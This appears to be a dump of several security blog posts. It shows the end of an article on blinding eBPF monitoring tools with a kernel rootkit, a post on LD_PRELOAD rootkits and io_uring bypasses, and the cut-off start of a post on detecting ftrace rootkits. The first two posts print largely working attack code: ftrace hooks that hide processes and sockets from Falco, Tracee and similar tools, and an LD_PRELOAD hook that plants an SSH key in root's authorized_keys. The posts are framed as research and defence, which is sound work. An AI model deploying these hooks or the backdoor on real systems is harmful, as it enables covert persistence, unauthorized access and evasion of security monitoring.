bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding, syscall-driven activity, and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution 